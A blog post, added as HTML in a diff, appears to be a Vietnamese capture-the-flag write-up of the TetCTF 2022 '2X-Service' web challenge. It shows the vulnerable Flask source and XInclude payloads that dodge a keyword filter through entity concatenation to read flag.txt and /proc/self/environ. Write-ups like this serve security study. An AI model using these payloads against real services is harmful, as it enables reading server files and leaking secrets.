@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>phucdc's Blog</title>
+<link
+    rel="stylesheet"
+    href="/assets/css/styles.css"
+/>
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/favicon-16x16.png">
+<link rel="mask-icon" href="/assets/favicon/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+
+
+
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+<link
+  rel="stylesheet"
+  href="https://cdn.rawgit.com/afeld/bootstrap-toc/v1.0.1/dist/bootstrap-toc.min.css"
+/>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+
+<script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+<script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js" integrity="sha512-IsNh5E3eYy3tr/JiX2Yx4vsCujtkhwl7SLqgnwLNgf04Hrt9BT9SXlLlZlWx+OK4ndzAoALhsMNcCmkggjZB1w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
+</head>
+<body>
+    <div class="container-fluid">
+        <div class="row">
+            <div class="col-md-2 bg-dark vh-100 sticky-top sidebar text-center">
+    <div class="avatar">
+        <img id="avatar" src="/assets/avatar.png" class="rounded-circle" alt="">
+    </div> <br>
+    <h3 class="text-white text-center">phucdc's Blog</h3>
+    <hr class="text-white">
+    <div class="nav">
+        <ul>
+            
+           <li class="nav-item">
+                <a href="/"><i class="bi bi-house"></i>Home</a>
+           </li> 
+           
+           <li class="nav-item">
+                <a href="/about/"><i class="bi bi-info-square"></i>About</a>
+           </li> 
+           
+        </ul>
+    </div>
+    <div class="nav contact">
+        <ul>
+            
+            <li class="nav-item">
+                <a href="https://github.com/phucdc-noob">
+                    <i class="bi bi-github"></i>
+                </a>
+            </li>
+            
+            <li class="nav-item">
+                <a href="https://twitter.com/PhucdcN">
+                    <i class="bi bi-twitter"></i>
+                </a>
+            </li>
+            
+            <li class="nav-item">
+                <a href="https://www.facebook.com/phuc.duongcong5545/">
+                    <i class="bi bi-facebook"></i>
+                </a>
+            </li>
+            
+            <li class="nav-item">
+                <a href="mailto:phucbontu1012@gmail.com">
+                    <i class="bi bi-envelope"></i>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+
+    
+
+            <div class="main col-md-8" id="main">
+                <div class="post" id="post">
+    <h1>TetCTF 2022 | Web Exploitation | 2X-Service</h1>
+    <span>Jan 03, 22</span>
+    <hr>
+    <div id="post-content"><h1 id="2x-service">2X-Service</h1>
+
+<p><img src="https://user-images.githubusercontent.com/82533607/147850702-16a63ccc-ba1d-4543-81ac-4aa052659960.png" alt="2x-service" /></p>
+
+<blockquote>
+  <p>Well, đây là bài duy nhất mà tôi giải được trong 2 ngày TetCTF, vẫn còn non quá mà :(((</p>
+</blockquote>
+
+<h2 id="source-code--analysis">Source code &amp; analysis</h2>
+
+<h3 id="source-code">Source code:</h3>
+
+<p>Đây là source code của <code class="language-plaintext highlighter-rouge">app.py</code>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">request</span>
+<span class="kn">from</span> <span class="nn">flask_socketio</span> <span class="kn">import</span> <span class="n">SocketIO</span><span class="p">,</span> <span class="n">emit</span><span class="p">,</span> <span class="n">send</span>
+<span class="kn">from</span> <span class="nn">xml.etree</span> <span class="kn">import</span> <span class="n">ElementTree</span><span class="p">,</span> <span class="n">ElementInclude</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'SECRET_KEY'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'XXXXXXXSECREKTXXXXXXXX'</span>
+<span class="n">socketio</span> <span class="o">=</span> <span class="n">SocketIO</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+	<span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s">'dashboard'</span><span class="p">))</span>
+
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/dashboard'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">dashboard</span><span class="p">():</span>
+	<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'./dashboard.html'</span><span class="p">)</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/source'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">source</span><span class="p">():</span>
+	<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'source.html'</span><span class="p">)</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/about'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">about</span><span class="p">():</span>
+	<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'about.html'</span><span class="p">)</span>
+
+
+<span class="o">@</span><span class="n">socketio</span><span class="p">.</span><span class="n">on</span><span class="p">(</span><span class="s">'message'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">handle_message</span><span class="p">(</span><span class="n">xpath</span><span class="p">,</span> <span class="n">xml</span><span class="p">):</span>
+	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">xpath</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">xml</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="s">"text"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">xml</span><span class="p">.</span><span class="n">lower</span><span class="p">():</span>
+		<span class="k">try</span><span class="p">:</span>
+			<span class="n">res</span> <span class="o">=</span> <span class="s">''</span>
+			<span class="n">root</span> <span class="o">=</span> <span class="n">ElementTree</span><span class="p">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">xml</span><span class="p">.</span><span class="n">strip</span><span class="p">())</span>
+			<span class="n">ElementInclude</span><span class="p">.</span><span class="n">include</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
+			<span class="k">for</span> <span class="n">elem</span> <span class="ow">in</span> <span class="n">root</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">xpath</span><span class="p">):</span>
+				<span class="k">if</span> <span class="n">elem</span><span class="p">.</span><span class="n">text</span> <span class="o">!=</span> <span class="s">""</span><span class="p">:</span>
+					<span class="n">res</span> <span class="o">+=</span> <span class="n">elem</span><span class="p">.</span><span class="n">text</span> <span class="o">+</span> <span class="s">", "</span>
+			<span class="n">emit</span><span class="p">(</span><span class="s">'result'</span><span class="p">,</span> <span class="n">res</span><span class="p">[:</span><span class="o">-</span><span class="mi">2</span><span class="p">])</span>
+		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+			<span class="n">emit</span><span class="p">(</span><span class="s">'result'</span><span class="p">,</span> <span class="s">'Nani?'</span><span class="p">)</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="n">emit</span><span class="p">(</span><span class="s">'result'</span><span class="p">,</span> <span class="s">'Nani?'</span><span class="p">)</span>
+
+
+<span class="o">@</span><span class="n">socketio</span><span class="p">.</span><span class="n">on</span><span class="p">(</span><span class="s">'my event'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">handle_my_custom_event</span><span class="p">(</span><span class="n">json</span><span class="p">):</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">'received json: '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">json</span><span class="p">))</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+	<span class="n">socketio</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8003</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="analysis">Analysis</h3>
+
+<p>Ở bài này sử dụng websocket thông qua <code class="language-plaintext highlighter-rouge">flask-socketio</code>, nhìn qua source code của <code class="language-plaintext highlighter-rouge">/dardboard</code> ta thấy có <code class="language-plaintext highlighter-rouge">jquery</code> và <code class="language-plaintext highlighter-rouge">socketio</code> được import sẵn, nhưng chưa khởi tạo <code class="language-plaintext highlighter-rouge">socket</code>:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"static/css/tsu.css"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"static/js/jquery.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"static/js/socket.io.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"static/js/tsu.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+
+
+<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+
+  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"header"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#default"</span> <span class="na">class=</span><span class="s">"logo"</span><span class="nt">&gt;</span>2X-Service<span class="nt">&lt;/a&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"header-right"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"active"</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;</span>
+      <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/source"</span><span class="nt">&gt;</span>Source<span class="nt">&lt;/a&gt;</span>
+      <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/about"</span><span class="nt">&gt;</span>About<span class="nt">&lt;/a&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;/div&gt;</span>
+
+<span class="nt">&lt;body&gt;</span>
+
+<span class="nt">&lt;br&gt;&lt;br&gt;</span>
+<span class="nt">&lt;center&gt;</span>
+	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form"</span> <span class="nt">&gt;</span>
+	    <span class="nt">&lt;label&gt;</span>XPATH<span class="nt">&lt;/label&gt;&lt;br&gt;</span>
+	    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">id=</span><span class="s">"xpath"</span> <span class="na">placeholder=</span><span class="s">"Ex: attribute"</span><span class="nt">&gt;&lt;br&gt;</span>
+
+	    <span class="nt">&lt;label&gt;</span>XML<span class="nt">&lt;/label&gt;</span>
+	    <span class="nt">&lt;textarea</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">id=</span><span class="s">"xml"</span> <span class="na">rows=</span><span class="s">"25"</span> <span class="na">placeholder=</span><span class="s">"Ex:&amp;#10;&lt;person&gt;&amp;#10;&lt;name&gt;tsu&lt;/name&gt;&amp;#10;&lt;attribute&gt;deptrai&lt;/attribute&gt;&amp;#10;&lt;/person&gt;"</span> <span class="nt">&gt;&lt;/textarea&gt;</span>
+	  
+	    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">id=</span><span class="s">"process"</span> <span class="na">value=</span><span class="s">"Process"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;/center&gt;</span>
+</code></pre></div></div>
+
+<p>Vì vậy, để gửi được request từ client đến socket tại server, ta cần thiết lập socket, sau khi đọc qua doc của <code class="language-plaintext highlighter-rouge">flask-socket</code>, mình đã tạo ra đoạn code <code class="language-plaintext highlighter-rouge">jquery</code> như sau:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Define the socket</span>
+<span class="nx">socket</span> <span class="o">=</span> <span class="nx">io</span><span class="p">()</span>
+<span class="c1">// Connect to server's socket</span>
+<span class="nx">socket</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://207.148.119.136:8003</span><span class="dl">'</span><span class="p">)</span>
+<span class="c1">// Test connection:</span>
+<span class="nx">socket</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">connect</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">hello?</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">hi</span><span class="dl">'</span><span class="p">)</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">socket</span><span class="p">.</span><span class="nx">connected</span><span class="p">)</span>
+<span class="p">})</span>
+<span class="c1">// Listen to response, then log to console</span>
+<span class="nx">socket</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">result</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+<span class="p">});</span>
+<span class="c1">// Submit form's content to server's socket</span>
+<span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">.form</span><span class="dl">'</span><span class="p">).</span><span class="nx">submit</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#xpath</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">(),</span> <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#xml</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">())</span>
+<span class="p">})</span>
+</code></pre></div></div>
+
+<p>Test thử xem sao:</p>
+
+<p><img src="https://user-images.githubusercontent.com/82533607/147850835-c6220de1-ba84-482b-b38f-da04f3c15ecc.png" alt="socket_connected" /></p>
+
+<p>Vậy là đã xong phần socket, bây giờ cần phân tích source code một chút, cụ thể là phần <code class="language-plaintext highlighter-rouge">message</code>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="n">socketio</span><span class="p">.</span><span class="n">on</span><span class="p">(</span><span class="s">'message'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">handle_message</span><span class="p">(</span><span class="n">xpath</span><span class="p">,</span> <span class="n">xml</span><span class="p">):</span>
+	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">xpath</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">xml</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="s">"text"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">xml</span><span class="p">.</span><span class="n">lower</span><span class="p">():</span>
+		<span class="k">try</span><span class="p">:</span>
+			<span class="n">res</span> <span class="o">=</span> <span class="s">''</span>
+			<span class="n">root</span> <span class="o">=</span> <span class="n">ElementTree</span><span class="p">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">xml</span><span class="p">.</span><span class="n">strip</span><span class="p">())</span>
+			<span class="n">ElementInclude</span><span class="p">.</span><span class="n">include</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
+			<span class="k">for</span> <span class="n">elem</span> <span class="ow">in</span> <span class="n">root</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">xpath</span><span class="p">):</span>
+				<span class="k">if</span> <span class="n">elem</span><span class="p">.</span><span class="n">text</span> <span class="o">!=</span> <span class="s">""</span><span class="p">:</span>
+					<span class="n">res</span> <span class="o">+=</span> <span class="n">elem</span><span class="p">.</span><span class="n">text</span> <span class="o">+</span> <span class="s">", "</span>
+			<span class="n">emit</span><span class="p">(</span><span class="s">'result'</span><span class="p">,</span> <span class="n">res</span><span class="p">[:</span><span class="o">-</span><span class="mi">2</span><span class="p">])</span>
+		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+			<span class="n">emit</span><span class="p">(</span><span class="s">'result'</span><span class="p">,</span> <span class="s">'Nani?'</span><span class="p">)</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="n">emit</span><span class="p">(</span><span class="s">'result'</span><span class="p">,</span> <span class="s">'Nani?'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>Đọc qua thì sẽ thấy phần này khá giống bài <a href="https://dauhoangtai.github.io/ctf/2021/11/13/WRITEUP-SVATTT-FINAL-2021-WEB.html#challenge-x-service">X-Service</a> của vòng chung kết SVATTT 2021.</p>
+
+<p>Ta có thể sử dụng payload sau:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version='1.0'?&gt;</span>
+<span class="nt">&lt;document</span> <span class="na">xmlns:xi=</span><span class="s">"http://www.w3.org/2001/XInclude"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;xi:include</span> <span class="na">href=</span><span class="s">"path_of_the_file"</span> <span class="na">parse=</span><span class="s">"text"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;/document&gt;</span>
+</code></pre></div></div>
+
+<p>Nhưng có một vấn đề là, <code class="language-plaintext highlighter-rouge">text</code> bị filter, sau khi đọc qua doc của <a href="https://www.w3.org/TR/xinclude-11">xi:include</a> thì mình nhận ra rằng, chẳng có <code class="language-plaintext highlighter-rouge">parser</code> nào có thể giải quyết vấn đề này, vì vậy, chỉ còn cách làm thế nào để <code class="language-plaintext highlighter-rouge">text</code> xuất hiện mà không bị filter.</p>
+
+<p>Thực ra mọi chuyện khá đơn giản, chúng ta có thể dùng phương pháp <code class="language-plaintext highlighter-rouge">concat</code> như sau:</p>
+
+<ul>
+  <li>Đầu tiên, define 2 biến <code class="language-plaintext highlighter-rouge">te</code> và <code class="language-plaintext highlighter-rouge">xt</code> thông qua <code class="language-plaintext highlighter-rouge">ENTITY</code></li>
+</ul>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version='1.0'?&gt;</span>
+<span class="cp">&lt;!DOCTYPE resources [
+  &lt;!ENTITY te "te"&gt;</span>
+  <span class="cp">&lt;!ENTITY xt "xt"&gt;</span>
+]&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Tiếp theo, sử dụng 2 biến đó:</li>
+</ul>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;document</span> <span class="na">xmlns:xi=</span><span class="s">"http://www.w3.org/2001/XInclude"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;p&gt;</span>
+  <span class="nt">&lt;xi:include</span> <span class="na">href=</span><span class="s">"flag.txt"</span> <span class="na">parse=</span><span class="s">"&amp;te;&amp;xt;"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/document&gt;</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>&amp;te;&amp;xt; &lt;=&gt; “te” + “xt” = “text”</p>
+</blockquote>
+
+<p>Và ta có payload hoàn chỉnh:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version='1.0'?&gt;</span>
+<span class="cp">&lt;!DOCTYPE resources [
+  &lt;!ENTITY te "te"&gt;</span>
+  <span class="cp">&lt;!ENTITY xt "xt"&gt;</span>
+]&gt;
+
+<span class="nt">&lt;document</span> <span class="na">xmlns:xi=</span><span class="s">"http://www.w3.org/2001/XInclude"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;p&gt;</span>
+  <span class="nt">&lt;xi:include</span> <span class="na">href=</span><span class="s">"flag.txt"</span> <span class="na">parse=</span><span class="s">"&amp;te;&amp;xt;"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/document&gt;</span>
+</code></pre></div></div>
+
+<p>Sử dụng <code class="language-plaintext highlighter-rouge">xpath = *</code>, đầu tiên, thử trên local xem sao?</p>
+
+<p><img src="https://user-images.githubusercontent.com/82533607/147851083-50c4ca78-6545-44eb-a839-51b320ac056b.png" alt="test" /></p>
+
+<p>OK, vậy là payload hoạt động tốt, vậy thử trên server xem sao?</p>
+
+<p><img src="https://user-images.githubusercontent.com/82533607/147851133-1ca3f3c1-3383-49ff-9735-fa62e78fe437.png" alt="test_server" /></p>
+
+<p>Oh, vậy là file <code class="language-plaintext highlighter-rouge">flag.txt</code> có thể không tồn tại, vậy là nó nằm ở đâu?</p>
+
+<p>Sau một hồi “fuzzing bằng cơm” thì tôi vô tình tìm thấy được flag tại <code class="language-plaintext highlighter-rouge">/proc/self/environ</code>:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version='1.0'?&gt;</span>
+<span class="cp">&lt;!DOCTYPE resources [
+  &lt;!ENTITY te "te"&gt;</span>
+  <span class="cp">&lt;!ENTITY xt "xt"&gt;</span>
+]&gt;
+
+<span class="nt">&lt;document</span> <span class="na">xmlns:xi=</span><span class="s">"http://www.w3.org/2001/XInclude"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;p&gt;</span>
+  <span class="nt">&lt;xi:include</span> <span class="na">href=</span><span class="s">"/proc/self/environ"</span> <span class="na">parse=</span><span class="s">"&amp;te;&amp;xt;"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/document&gt;</span>
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/82533607/147851230-9c48d2de-6d3e-44f0-a123-6e741fcbc1bd.png" alt="flag" /></p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">FLAG=TetCTF{Just_Warm_y0u_uP_:P__}</code></p>
+
+<blockquote>
+  <p>Từ sáng đến tối chỉ để giải được 1 bài web duy nhất 😞</p>
+</blockquote>
+</div>
+</div>
+<script>
+    var imgEl = document.getElementsByTagName('img');
+    for (var i=0; i<imgEl.length; i++) {
+        if (imgEl[i].getAttribute('src') && imgEl[i].id != 'avatar') {
+        imgEl[i].setAttribute('data-src',imgEl[i].getAttribute('src'));
+        imgEl[i].removeAttribute('src'); //use only if you need to remove data-src attribute after setting src
+        }
+    }
+    $(function() {
+
+        const IMG_SCOPE = '.main .post';
+      
+        if ($(`${IMG_SCOPE} img`).length <= 0 ) {
+          return;
+        }
+      
+        /* lazy loading */
+      
+        const imgList = document.querySelectorAll(`${IMG_SCOPE} img[data-src]`);
+        const observer = lozad(imgList);
+        observer.observe();
+      
+        /* popup */
+      
+        $(`${IMG_SCOPE} p > img[data-src],${IMG_SCOPE} img[data-src].preview-img`).each(
+          function() {
+            let nextTag = $(this).next();
+            const title = nextTag.prop('tagName') === 'EM' ? nextTag.text() : '';
+            const src = $(this).attr('data-src'); // created by lozad.js
+      
+            $(this).wrap(`<a href="${src}" title="${title}" class="popup"></a>`);
+          }
+        );
+      
+        $('.popup').magnificPopup({
+          type: 'image',
+          closeOnContentClick: true,
+          showCloseBtn: false,
+          zoom: {
+            enabled: true,
+            duration: 300,
+            easing: 'ease-in-out'
+          }
+        });
+      
+        /* markup the image links */
+      
+        $(`${IMG_SCOPE} a`).has('img').addClass('img-link');
+      
+      });
+</script>
+            </div>
+            
+
+
+
+
+<div class="col-md-2 bg-black vh-100 sticky-top toc-container" > 
+  <span class="text-white">Content</span><br><br>
+  <div id="toc">
+
+  </div>
+</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.min.js"></script>
+<script>
+  tocbot.init({
+    // Where to render the table of contents.
+    tocSelector: '#toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: '#post-content',
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: 'h2, h3, h4, h5, h6',
+    // For headings inside relative or absolute positioned containers within content.
+    hasInnerContainers: true,
+  });
+</script>
+
+
+        </div>
+    </div>
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({
+          tex2jax: {
+            inlineMath: [['$','$'], ['\\(','\\)']],
+            processEscapes: true
+          }
+        });
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
+</body>
+</html>
+
+
